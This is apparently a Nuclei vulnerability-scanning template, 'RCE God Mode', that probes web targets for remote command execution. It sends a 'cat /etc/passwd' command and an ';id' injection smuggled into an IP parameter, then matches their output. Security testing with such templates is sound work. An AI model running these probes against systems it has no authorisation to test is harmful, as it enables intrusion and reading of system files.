id: K70n0s510-rce-godmode
info:
  name: RCE God Mode
  author: K70n0s510
  severity: critical
  tags: rce,fuzz
http:
  - method: GET
    path:
      - "{{BaseURL}}/?cmd=cat+/etc/passwd"
      - "{{BaseURL}}/?ip=127.0.0.1;id"
    matchers-condition: and
    matchers:
      - type: regex
        regex: ["root:.*:0:0:", "uid=[0-9]+.*gid=[0-9]+"]
      - type: word
        words: ["AkamaiGHost", "Access Denied"]
        negative: true
